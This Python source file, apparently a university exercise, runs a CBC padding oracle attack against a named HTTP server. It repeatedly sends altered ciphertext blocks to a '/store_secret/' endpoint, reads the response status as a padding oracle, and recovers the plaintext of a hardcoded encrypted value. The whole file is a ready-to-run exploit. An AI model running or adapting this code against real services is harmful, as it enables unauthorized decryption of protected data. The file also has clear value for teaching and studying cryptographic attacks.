"""Padding Oracle Attack in Python."""

import urllib.parse
import base64
import array
import http.client
import random


def run():
    """Run main code."""
    url_query = ("NkivYeRHPWegVIG%2FgiptBChbA8%2BZtjWslmOGB58oathyv1U13KIYy4kV"
                 "C3Wuq4LcahaFL8lrxTl76VU921AVJw%3D%3D")
    block_size = 16
    cipher_blocks = split_list(decode(url_query), block_size)
    plain_blocks = list(cipher_blocks)

    connection = http.client.HTTPConnection("gruenau4.informatik.hu-berlin.de",
                                            8888)

    for k in reversed(range(1, len(cipher_blocks))):
        print("{} {} {}".format("+++++++++++++++++++++ Block:", k + 1,
                                "+++++++++++++++++++++"))
        c_1 = cipher_blocks[k - 1]
        c_2 = cipher_blocks[k]
        i_2 = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
        p_2 = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
        c1_mod = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
        padding_length = 1

        for i in reversed(range(0, block_size)):
            print("{} {} {}".format("--------------------- Position:", i + 1,
                                    "---------------------"))
            for j in range(0, i + 1):
                c1_mod[j] = random.randint(0, 255)
            c1_mod = search_r(c1_mod, c_2, i, connection)
            print("{}: {}".format("C1'", c1_mod))
            i_2[i] = c1_mod[i] ^ padding_length
            print("{}: {}".format("I2'", i_2))
            p_2[i] = c_1[i] ^ i_2[i]
            print("{}: {}".format("P2", p_2))
            padding_length += 1
            for j in reversed(
                    range(block_size - (padding_length - 1), block_size)):
                c1_mod[j] = padding_length ^ i_2[j]

        plain_blocks[k] = p_2

    connection.close()
    plaintext = concat_list(plain_blocks[1:])
    print("{}: {}".format("Plaintext", array.array('B', plaintext).tostring()))


def decode(url_query):
    """Decode base64 url to list of decimal values."""
    decoded_url = urllib.parse.unquote(url_query)
    return list(base64.b64decode(decoded_url))


def encode(ciphertext):
    """Encode list of decimal values to base64 url."""
    as_string = array.array('B', ciphertext).tostring()
    encoded_base64 = base64.b64encode(as_string)
    encoded_url = urllib.parse.quote(encoded_base64, safe='')
    return encoded_url


def split_list(input_list, chunk_size):
    """Split a list in equal sized chunks."""
    return ([
        input_list[i:i + chunk_size]
        for i in range(0, len(input_list), chunk_size)
    ])


def concat_list(lists):
    """Concatenate lists to one list."""
    concat_ls = []
    for item in lists:
        concat_ls += item
    return concat_ls


def search_r(c1_mod, c_2, position, connection):
    """Search a byte where the padding is right."""
    c1_mod[position] = 0
    for i in range(1, 256):
        oracle_request = concat_list([c1_mod, c_2])
        if send_request(encode(oracle_request), connection) == 200:
            break

        else:
            c1_mod[position] = 0 ^ i
    return c1_mod


def send_request(query, connection):
    """Send a request with the ciphertext to the server."""
    connection.request("GET", "/store_secret/?secret=" + query)
    response = connection.getresponse()
    status = response.status
    response.read()
    return status


if __name__ == "__main__":
    run()
